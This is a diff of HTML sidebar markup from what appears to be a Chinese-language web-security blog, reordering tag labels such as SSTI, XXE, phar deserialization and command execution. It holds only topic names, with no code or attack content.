         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
-        <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
-    
         <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
-        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+        <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
         <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
     
-        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
-    
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="nginx常见文件位置"><span class="iconfont-archer">&#xe606;</span>nginx常见文件位置</span>
     
         <span class="sidebar-tag-name" data-tags=".htaccess利用"><span class="iconfont-archer">&#xe606;</span>.htaccess利用</span>
-    
-        <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
     
         <span class="sidebar-tag-name" data-tags="metasploit"><span class="iconfont-archer">&#xe606;</span>metasploit</span>
     
@@ -2755,23 +2723,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
     
+        <span class="sidebar-tag-name" data-tags="提权"><span class="iconfont-archer">&#xe606;</span>提权</span>
+    
+        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
+    
         <span class="sidebar-tag-name" data-tags="代码执行"><span class="iconfont-archer">&#xe606;</span>代码执行</span>
+    
+        <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
         <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
     
-        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
-    
-        <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
+        <span class="sidebar-tag-name" data-tags="命令执行"><span class="iconfont-archer">&#xe606;</span>命令执行</span>
     
         <span class="sidebar-tag-name" data-tags="变量覆盖漏洞"><span class="iconfont-archer">&#xe606;</span>变量覆盖漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="命令执行"><span class="iconfont-archer">&#xe606;</span>命令执行</span>
+        <span class="sidebar-tag-name" data-tags="Django"><span class="iconfont-archer">&#xe606;</span>Django</span>
     
         <span class="sidebar-tag-name" data-tags="弱类型比较"><span class="iconfont-archer">&#xe606;</span>弱类型比较</span>
-    
-        <span class="sidebar-tag-name" data-tags="Django"><span class="iconfont-archer">&#xe606;</span>Django</span>
     
         <span class="sidebar-tag-name" data-tags="文件上传漏洞"><span class="iconfont-archer">&#xe606;</span>文件上传漏洞</span>
     
